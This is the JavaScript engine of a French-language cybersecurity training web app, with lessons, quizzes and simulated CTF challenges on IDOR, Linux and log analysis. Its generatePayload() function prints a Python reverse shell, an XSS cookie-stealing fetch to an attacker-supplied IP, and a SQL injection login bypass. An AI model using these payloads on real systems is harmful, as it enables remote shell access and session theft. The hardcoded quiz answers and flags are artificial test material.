/* =========================================================================
   CYBERACADEMY PRO - Core Engine v7.0
   Features : Theory First, Interactive Simulators, Real QCM Validation
   ========================================================================= */

const trackDB = {
    "red": [
        {
            id: 101, title: "Niveau 1 : Reconnaissance et Failles Web",
            themes: [
                { 
                    id: "r_linux", title: "Le Cœur de Linux", desc: "Architecture, permissions et fichiers cachés.", 
                    content: `
                        <h2>Pourquoi Linux est incontournable ?</h2>
                        <p>Plus de 90% des serveurs utilisent Linux. Un professionnel de la cybersécurité doit maîtriser la ligne de commande. Sous Linux, <strong>tout est un fichier</strong>.</p>
                        <div class="media-wrapper">
                            <img src="https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&q=80" alt="Terminal Linux">
                        </div>
                        <h2>Le secret des fichiers cachés</h2>
                        <p>Les fichiers commençant par un point (<code>.</code>) sont masqués par défaut. Il faut utiliser l'argument 'all' : <code>ls -a</code>.</p>
                    `, 
                    simType: "terminal", 
                    simData: { instruction: "Affichez tous les fichiers cachés.", expected: "ls -a", successOutput: "Fichiers détectés : config.php, index.html, .secret_flag" }, 
                    quiz: [{ q: "Quelle commande liste les fichiers cachés ?", options: ["cd /", "ls -a", "pwd"], ans: "1" }] 
                },
                { 
                    id: "r_idor", title: "Faille IDOR (Insecure Direct Object Reference)", desc: "Manipuler les identifiants d'objets.", 
                    content: `
                        <h2>Qu'est-ce qu'une faille IDOR ?</h2>
                        <p>Une faille IDOR survient lorsqu'une application utilise un identifiant direct (comme un numéro d'utilisateur <code>?id=42</code>) pour accéder à des données, sans vérifier si l'utilisateur connecté a le droit de voir cette ressource.</p>
                        <div class="media-wrapper">
                            <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&q=80" alt="Code Security">
                        </div>
                        <h2>Exploitation et Impact</h2>
                        <p>Si vous êtes connecté en tant qu'utilisateur normal (ID 10) et que vous changez l'URL en <code>id=1</code> (compte Administrateur), un serveur vulnérable vous renverra directement les données confidentielles de l'admin.</p>
                    `, 
                    simType: "idor", 
                    simData: { instruction: "Modifiez l'ID de l'objet pour cibler le profil administrateur (ID 1)." }, 
                    quiz: [{ q: "Comment se protège-t-on contre une faille IDOR ?", options: ["En cachant les boutons du site", "En vérifiant systématiquement les autorisations côté serveur"], ans: "1" }] 
                }
            ],
            exam: [{ q: "Que signifie l'acronyme IDOR ?", options: ["Internal Direct Object Routing", "Insecure Direct Object Reference", "Internet Data Object Request"], ans: "1" }]
        }
    ],
    "blue": [
        {
            id: 201, title: "Niveau 1 : Analyse de Logs",
            themes: [
                { 
                    id: "b_logs", title: "Analyse de Logs Serveur", desc: "Traquer un attaquant dans Apache.", 
                    content: `
                        <h2>Le journal de bord du serveur</h2>
                        <p>Dans un SOC, le défenseur surveille les logs. Chaque requête HTTP consigne l'IP source, l'horodatage et la charge utile (payload).</p>
                    `, 
                    simType: "logs", 
                    simData: { instruction: "Trouvez l'IP de l'attaquant." }, 
                    quiz: [{ q: "Quel code HTTP indique un succès ?", options: ["404", "200", "500"], ans: "1" }] 
                }
            ],
            exam: [{ q: "Quel fichier examine-t-on en premier après un incident web ?", options: ["access.log", "readme.txt"], ans: "0" }]
        }
    ],
    "code": [
        {
            id: 301, title: "Niveau 1 : Python pour le Hacking",
            themes: [
                { 
                    id: "c_py1", title: "Requêtes Web en Python", desc: "Automatiser l'interaction web.", 
                    content: `<h2>Le module Requests</h2><p>Indispensable pour scripter des requêtes HTTP en Python.</p>`, 
                    simType: "code", simData: { instruction: "Importez requests." }, quiz: [{ q: "Quel module ?", options: ["os", "requests"], ans: "1" }] 
                }
            ],
            exam: [{ q: "Python est...", options: ["Compilé", "Interprété"], ans: "1" }]
        }
    ],
    "dev": [
        {
            id: 401, title: "Niveau 1 : Architecture du Web",
            themes: [
                { 
                    id: "d_html", title: "Le DOM (HTML)", desc: "Structure d'une page web.", 
                    content: `<h2>Balisage HTML</h2><p>Le HTML structure les éléments visuels.</p>`, 
                    simType: "dev_html", simData: { instruction: "Écrivez un h1 contenant 'Hack'." }, quiz: [{ q: "Balise de lien ?", options: ["<a>", "<link>"], ans: "0" }] 
                }
            ],
            exam: [{ q: "CSS gère...", options: ["Le design", "La base de données"], ans: "0" }]
        }
    ]
};

const ctfDB = [
    { id: "ctf1", title: "L'Inspecteur", difficulty: "Débutant", category: "Web", points: 100, reqTrack: "dev", reqLevel: 401, desc: "Fouillez le code source.", expectedFlag: "FLAG{html_source_ez}", simType: "html" },
    { id: "ctf2", title: "IDOR Master", difficulty: "Intermédiaire", category: "Red Team", points: 250, reqTrack: "red", reqLevel: 101, desc: "Exploitez l'IDOR pour voler le flag admin.", expectedFlag: "FLAG{idor_admin_leak}", simType: "idor_ctf" },
    { id: "ctf3", title: "Log Hunter", difficulty: "Intermédiaire", category: "Blue Team", points: 300, reqTrack: "blue", reqLevel: 201, desc: "Trouvez l'IP dans les logs.", expectedFlag: "FLAG{blue_log_master}", simType: "ctf_logs" }
];

let accounts = {};
let activeUser = null;
let currentTrack = null;
let authMode = 'login';
let state = { completedCourses: [], completedExams: [], completedCTF: [] };

async function initApp() {
    try {
        const storedDB = localStorage.getItem('cyberacademy_pro_v3');
        if (storedDB) accounts = JSON.parse(storedDB);
        const session = localStorage.getItem('cyberacademy_session_v3');
        if (session && accounts[session]) loginUser(session);
    } catch (e) { accounts = {}; }
}

async function hashPassword(password) {
    const data = new TextEncoder().encode(password);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag]));
}

function switchView(targetViewId) {
    document.querySelectorAll('.view-section').forEach(el => { 
        el.classList.remove('active-view'); 
        el.style.display = 'none'; 
    });
    const target = document.getElementById(targetViewId);
    if (target) { 
        if(targetViewId === 'auth-view') target.style.display = 'flex';
        else target.style.display = 'block';
        setTimeout(() => target.classList.add('active-view'), 10); 
    }
    window.scrollTo(0, 0);
    if(targetViewId === 'dashboard-view') updateDashboardStats();
}

function setAuthMode(mode) {
    authMode = mode;
    document.getElementById('tab-login').classList.toggle('active', mode === 'login');
    document.getElementById('tab-register').classList.toggle('active', mode === 'register');
    const btn = document.getElementById('auth-btn-action');
    btn.innerText = mode === 'login' ? "INITIALISER LA SESSION" : "CRÉER LE COMPTE";
    document.getElementById('auth-msg').style.display = 'none';
}

async function processAuth() {
    const user = document.getElementById('auth-user').value.trim();
    const pass = document.getElementById('auth-pass').value.trim();
    const msgBox = document.getElementById('auth-msg');
    
    if (!user || !pass) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Champs requis manquants."; return; }
    const secureHash = await hashPassword(pass); 

    if (authMode === 'register') {
        if (accounts[user]) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiant déjà utilisé."; } 
        else {
            accounts[user] = { passHash: secureHash, completedCourses: [], completedExams: [], completedCTF: [] };
            localStorage.setItem('cyberacademy_pro_v3', JSON.stringify(accounts));
            msgBox.style.display='block'; msgBox.style.color='var(--accent)'; msgBox.innerText="Compte créé avec succès. Connexion...";
            setTimeout(() => loginUser(user), 1000);
        }
    } else {
        if (!accounts[user] || accounts[user].passHash !== secureHash) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiants incorrects."; } 
        else { loginUser(user); }
    }
}

function loginUser(username) {
    activeUser = username;
    localStorage.setItem('cyberacademy_session_v3', username);
    state = {
        completedCourses: accounts[username].completedCourses || [],
        completedExams: accounts[username].completedExams || [],
        completedCTF: accounts[username].completedCTF || []
    };
    
    document.getElementById('main-header').style.display = 'flex';
    document.getElementById('header-user').innerText = "@" + username;
    
    updateProfileUI();
    renderCTF();
    switchView('dashboard-view');
}

function logout() {
    activeUser = null;
    localStorage.removeItem('cyberacademy_session_v3');
    document.getElementById('main-header').style.display = 'none';
    setAuthMode('login');
    switchView('auth-view');
}

function saveProgress() {
    if (activeUser && accounts[activeUser]) {
        accounts[activeUser] = { ...accounts[activeUser], ...state };
        localStorage.setItem('cyberacademy_pro_v3', JSON.stringify(accounts));
    }
    updateProfileUI();
}

function updateProfileUI() {
    let pts = (state.completedCourses.length * 50) + (state.completedExams.length * 200) + (state.completedCTF.length * 150);
    document.getElementById('header-points').innerText = pts.toString().padStart(4, '0') + " PTS";
    let rank = "Recrue"; if(pts >= 500) rank = "Initié"; if(pts >= 1200) rank = "Opérateur";
    document.getElementById('header-rank').innerText = rank;
}

function updateDashboardStats() {
    let pts = (state.completedCourses.length * 50) + (state.completedExams.length * 200) + (state.completedCTF.length * 150);
    let rank = "Recrue"; if(pts >= 500) rank = "Initié"; if(pts >= 1200) rank = "Opérateur";
    
    document.getElementById('dash-rank').innerText = rank;
    document.getElementById('dash-pts').innerText = pts.toString().padStart(4, '0') + " PTS";
    document.getElementById('dash-ctf-count').innerText = `${state.completedCTF.length} / ${ctfDB.length}`;
}

function openForensicsLesson(type) {
    const box = document.getElementById('forensics-content-box');
    box.style.display = 'block';
    let content = "";
    if(type === 'pcap') { content = `<h2>Analyse de Trames Réseau (PCAP)</h2><p>Une capture PCAP enregistre chaque paquet traversant une interface réseau. Avec des filtres Wireshark comme <code>http.request.method == "POST"</code>, on isole le trafic sensible.</p>`; } 
    else if(type === 'memory') { content = `<h2>Analyse de Dump RAM avec Volatility</h2><p>Volatility est le framework standard pour examiner la mémoire vive.</p>`; }
    box.innerHTML = `<div class="content-box">${content}<button class="btn-back" onclick="document.getElementById('forensics-content-box').style.display='none'">Fermer</button></div>`;
    box.scrollIntoView({ behavior: 'smooth' });
}

function openTrack(trackKey) {
    currentTrack = trackKey;
    document.getElementById('tracks-selection').style.display = 'none';
    document.getElementById('track-content').style.display = 'block';
    
    const titles = { "dev": "🌐 Fondations Web", "red": "🔴 Red Team", "blue": "🔵 Blue Team", "code": "💻 Scripting Python" };
    document.getElementById('current-track-title').innerText = titles[trackKey];
    
    const container = document.getElementById('levels-container');
    container.innerHTML = '';
    
    trackDB[trackKey].forEach((level, index) => {
        const unlocked = index === 0 || state.completedExams.includes(trackDB[trackKey][index - 1].id);
        const statusBadge = unlocked ? `<span class="status-badge unlocked">🔓 DÉBLOQUÉ</span>` : `<span class="status-badge locked">🔒 VERROUILLÉ</span>`;

        let themesHTML = ''; 
        let allDone = true;
        level.themes.forEach(theme => {
            const isDone = state.completedCourses.includes(theme.id);
            if(!isDone) allDone = false;
            const cardClass = "theme-card " + (isDone ? 'completed' : '') + (!unlocked ? ' disabled' : '');
            themesHTML += `<div class="${cardClass}" onclick="openCourse('${trackKey}', '${theme.id}', ${unlocked})"><div class="theme-title">${theme.title}</div><div class="theme-desc">${theme.desc}</div></div>`;
        });

        const examDone = state.completedExams.includes(level.id);
        let examHTML = '';
        if (unlocked && allDone && !examDone) {
            examHTML = `<button class="auth-btn" style="margin-top:15px; background:var(--warning); color:#000;" onclick="passExam(${level.id})">Passer l'Examen de Niveau (Débloque les CTF)</button>`;
        } else if (examDone) {
            examHTML = `<div style="margin-top:15px; color:var(--accent); font-family:monospace; font-weight:bold;">[ NIVEAU CERTIFIÉ & VALIDÉ ]</div>`;
        } else if (unlocked && !allDone) {
            examHTML = `<div style="margin-top:15px; color:var(--text-muted); font-size:0.85rem;">* Validez tous les cours ci-dessus pour débloquer l'examen.</div>`;
        }

        container.innerHTML += `<div class="level-section" style="padding:20px; margin-bottom:20px; background:rgba(0,0,0,0.4); border-radius:8px;"><div class="level-header" style="display:flex; justify-content:space-between; margin-bottom:15px;"><h3>${level.title}</h3>${statusBadge}</div><div class="theme-grid">${themesHTML}</div>${examHTML}</div>`;
    });
}

function passExam(levelId) {
    if(!state.completedExams.includes(levelId)) {
        state.completedExams.push(levelId);
        saveProgress();
        alert("Examen réussi avec succès ! Niveau validé et CTF associés débloqués.");
        openTrack(currentTrack);
        renderCTF();
    }
}

function backToTracks() {
    currentTrack = null;
    document.getElementById('track-content').style.display = 'none';
    document.getElementById('tracks-selection').style.display = 'grid';
}

function openCourse(trackKey, themeId, isUnlocked) {
    if (!isUnlocked) return;
    let currentCourse = null;
    trackDB[trackKey].forEach(l => l.themes.forEach(t => { if (t.id === themeId) currentCourse = t; }));
    
    document.getElementById('theme-view').dataset.courseId = themeId;
    document.getElementById('lesson-title').innerText = currentCourse.title;
    document.getElementById('lesson-desc').innerText = currentCourse.desc;
    document.getElementById('lesson-content').innerHTML = currentCourse.content;
    
    const simC = document.getElementById('simulator-container');
    if (currentCourse.simType === "terminal") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">💻 [ TERMINAL ] : ${currentCourse.simData.instruction}</div><input type="text" id="term-input" class="term-input" placeholder="root@academy:~#" autocomplete="off" onkeypress="handleTerm(event, '${btoa(currentCourse.simData.expected)}', '${btoa(currentCourse.simData.successOutput)}')"><div id="term-output" class="term-output">En attente...</div></div>`; }
    else if (currentCourse.simType === "idor") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">🌐 [ SIMULATEUR IDOR ] : ${currentCourse.simData.instruction}</div><div style="margin-bottom:10px;">URL ciblée : <code id="idor-url">http://target.htb/api/user?id=10</code></div><input type="text" id="idor-input" class="web-input" value="10" placeholder="ID..."><button class="auth-btn" style="background:var(--danger);" onclick="checkIDOR()">Envoyer la requête</button><div id="idor-output" class="term-output">Profil utilisateur normal chargé (ID: 10).</div></div>`; }
    else if (currentCourse.simType === "logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">🔵 [ LOG VIEWER ]</div><div class="log-viewer">192.168.1.50 - GET /login?user=' OR 1=1</div><input type="text" id="log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkLogs()">Analyser</button><div id="log-output" class="term-output"></div></div>`; }
    else { simC.innerHTML = ''; }
    
    let quizHTML = '';
    currentCourse.quiz.forEach((q, qIndex) => {
        let optionsHTML = '';
        q.options.forEach((opt, optIndex) => { optionsHTML += `<label><input type="radio" name="cq_${qIndex}" value="${btoa(optIndex.toString())}"> ${opt}</label>`; });
        quizHTML += `<div style="margin-bottom:20px;"><p style="font-weight:bold; margin-bottom:10px; color:#fff;">${q.q}</p><div class="options">${optionsHTML}</div></div>`;
    });
    document.getElementById('quiz-content').innerHTML = quizHTML;
    document.getElementById('quiz-result').style.display = 'none';
    switchView('theme-view');
}

function handleTerm(e, expectedHash, outputHash) { if (e.key === 'Enter') { const val = escapeHTML(e.target.value.trim().toLowerCase()); if (btoa(val) === expectedHash) { document.getElementById('term-output').innerHTML = "<span style='color:var(--accent);'>" + atob(outputHash) + "</span>"; } else { document.getElementById('term-output').innerHTML = `<span style='color:var(--danger);'>bash: ${val}: command not found</span>`; } } }
function checkIDOR() {
    const val = document.getElementById('idor-input').value.trim();
    const out = document.getElementById('idor-output');
    if(val === "1") { out.innerHTML = "<span style='color:var(--accent);'>[SUCCESS IDOR] Données Administrateur récupérées :<br>{ \"user\": \"admin\", \"role\": \"superuser\", \"secret_token\": \"FLAG{idor_success_01}\" }</span>"; } 
    else { out.innerHTML = `Profil standard chargé pour l'ID : ${val}.`; }
}
function checkLogs() { const val = document.getElementById('log-input').value.trim(); if (val === "192.168.1.50") { document.getElementById('log-output').innerHTML = "<span style='color:var(--accent);'>[IP CONFIRMÉE] Attaque identifiée.</span>"; } else { document.getElementById('log-output').innerHTML = "Rien."; } }

function submitThemeQCM() {
    const courseId = document.getElementById('theme-view').dataset.courseId;
    let currentCourse = null;
    trackDB[currentTrack].forEach(l => l.themes.forEach(t => { if (t.id === courseId) currentCourse = t; }));

    let allCorrect = true;
    currentCourse.quiz.forEach((q, index) => {
        const inputs = document.getElementsByName('cq_' + index);
        let selectedVal = null;
        for(let i=0; i<inputs.length; i++) { if(inputs[i].checked) selectedVal = inputs[i].value; }
        if (selectedVal !== btoa(q.ans)) allCorrect = false;
    });
    
    const resBox = document.getElementById('quiz-result');
    resBox.style.display = 'block';
    
    if (allCorrect) {
        resBox.className = 'res-success'; resBox.style.background = 'rgba(16, 185, 129, 0.2)'; resBox.style.color = 'var(--accent)'; resBox.style.border = '1px solid var(--accent)';
        resBox.innerText = "[+] Module Validé !";
        if (!state.completedCourses.includes(courseId)) { state.completedCourses.push(courseId); saveProgress(); openTrack(currentTrack); }
        setTimeout(() => switchView('tracks-view'), 1000);
    } else {
        resBox.className = 'res-error'; resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
        resBox.innerText = "[-] Échec de l'audit. Relisez le cours.";
    }
}

function renderCTF() {
    const container = document.getElementById('ctf-container');
    container.innerHTML = '';
    
    ctfDB.forEach(ctf => {
        const isDone = state.completedCTF.includes(ctf.id);
        let isUnlocked = ctf.reqTrack === null || state.completedExams.includes(ctf.reqLevel);
        let catColor = "var(--danger)";
        if(ctf.category === "Blue Team") catColor = "#3b82f6";
        
        if (isUnlocked) {
            const cardClass = "theme-card " + (isDone ? 'completed' : '');
            container.innerHTML += `<div class="${cardClass}" style="border-left: 4px solid ${catColor}; position:relative;" onclick="openCTF('${ctf.id}')"><div style="color:${catColor}; font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty} | ${ctf.points} PTS</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">${ctf.desc}</div></div>`;
        } else {
            container.innerHTML += `<div class="theme-card ctf-locked" style="border-left: 4px solid #333; position:relative;"><div class="lock-icon">🔒</div><div style="color:var(--text-muted); font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty}</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">Requis : Valider l'examen du niveau ${ctf.reqLevel}</div></div>`;
        }
    });
}

function openCTF(ctfId) {
    let currentCTF = null; ctfDB.forEach(c => { if(c.id === ctfId) currentCTF = c; });
    document.getElementById('challenge-view').dataset.ctfId = ctfId;
    document.getElementById('challenge-desc').innerHTML = `<h2>${currentCTF.title}</h2><p>${currentCTF.desc}</p>`;
    
    const simC = document.getElementById('challenge-sim-container');
    if(currentCTF.simType === "html") { simC.innerHTML = `<div class="sim-box"><div class="sim-header">💻 Faux Navigateur Web</div><div style="background:#fff; color:#000; padding:20px; text-align:center;"><h1>Admin</h1></div><button onclick="document.getElementById('source-code').style.display='block'" class="btn-back" style="margin-top:10px;">Code source</button><div id="source-code" style="display:none; margin-top:15px; color:#4ade80; font-family:monospace;">&lt;html&gt;<br>&nbsp;&nbsp;&lt;!-- FLAG{html_source_ez} --&gt;<br>&lt;/html&gt;</div></div>`; }
    else if(currentCTF.simType === "idor_ctf") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">Cible IDOR CTF</div><input type="text" id="ctf-idor-id" class="web-input" value="5" placeholder="ID..."><button class="auth-btn" style="background:var(--danger);" onclick="checkCTFIDOR()">Inspecter</button><div id="ctf-idor-out" class="term-output"></div></div>`; }
    else if(currentCTF.simType === "ctf_logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">Logs</div><div class="log-viewer">172.16.0.4 - SQLi attempt</div><input type="text" id="ctf-log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkCTFLog()">Valider</button><div id="ctf-log-out" class="term-output"></div></div>`; }
    else { simC.innerHTML = ''; }
    
    document.getElementById('flag-input').value = '';
    document.getElementById('flag-result').style.display = 'none';
    switchView('challenge-view');
}

function checkCTFIDOR() {
    const val = document.getElementById('ctf-idor-id').value.trim();
    const out = document.getElementById('ctf-idor-out');
    if(val === "1") { out.innerHTML = "<span style='color:var(--accent);'>Données admin : FLAG{idor_admin_leak}</span>"; }
    else { out.innerHTML = "Utilisateur standard."; }
}
function checkCTFLog() { const val = document.getElementById('ctf-log-input').value.trim(); if(val === "172.16.0.4") { document.getElementById('ctf-log-out').innerHTML = "<span style='color:var(--accent);'>FLAG{blue_log_master}</span>"; } }

function submitFlag() {
    const ctfId = document.getElementById('challenge-view').dataset.ctfId;
    const flagVal = escapeHTML(document.getElementById('flag-input').value.trim());
    const resBox = document.getElementById('flag-result');
    let currentCTF = null; ctfDB.forEach(c => { if(c.id === ctfId) currentCTF = c; });
    
    resBox.style.display = 'block';
    if (flagVal === currentCTF.expectedFlag) {
        resBox.style.background = 'rgba(16, 185, 129, 0.2)'; resBox.style.color = 'var(--accent)'; resBox.style.border = '1px solid var(--accent)';
        resBox.innerText = `[+] PWNED ! +${currentCTF.points} PTS`;
        if (!state.completedCTF.includes(ctfId)) { state.completedCTF.push(ctfId); saveProgress(); renderCTF(); }
        setTimeout(() => switchView('ctf-view'), 2000);
    } else {
        resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
        resBox.innerText = "[-] Flag Incorrect.";
    }
}

function generatePayload() {
    const type = document.getElementById('payload-type').value;
    const ip = escapeHTML(document.getElementById('payload-ip').value.trim());
    const out = document.getElementById('payload-out');
    if(type === 'py_rev') { out.innerHTML = `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${ip}",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`; }
    else if(type === 'xss_cookie') { out.innerHTML = `&lt;script&gt;fetch('http://${ip}/log?cookie=' + btoa(document.cookie));&lt;/script&gt;`; }
    else if(type === 'sql_bypass') { out.innerHTML = `admin' OR 1=1 -- -`; }
}

async function generateHash() {
    const text = document.getElementById('tool-hash-in').value;
    const out = document.getElementById('tool-hash-out');
    if(!text) { out.innerText = "..."; return; }
    const encoder = new TextEncoder(); const data = encoder.encode(text);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    out.innerText = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

function handleBase64(action) {
    const text = escapeHTML(document.getElementById('tool-b64-in').value);
    const out = document.getElementById('tool-b64-out');
    try { if(action === 'encode') out.innerText = btoa(text); else out.innerText = atob(text); } 
    catch(e) { out.innerText = "Error: Invalid payload."; }
}

function toggleHUD() { document.getElementById('hud-terminal').classList.toggle('open'); }
function handleHUD(e) {
    if (e.key === 'Enter') {
        const inputEl = document.getElementById('hud-input');
        const outEl = document.getElementById('hud-output');
        const val = escapeHTML(inputEl.value.trim().toLowerCase());
        outEl.innerHTML += `<br><span style="color:var(--accent);">> ${val}</span>`;
        let response = val === "whoami" ? `User: ${activeUser || "Anonymous"}` : (val === "help" ? "Commandes : whoami, search" : "OK");
        outEl.innerHTML += `<br><span style="color:var(--text-main);">${response}</span>`;
        outEl.scrollTop = outEl.scrollHeight;
        inputEl.value = '';
    }
}

window.onload = initApp;
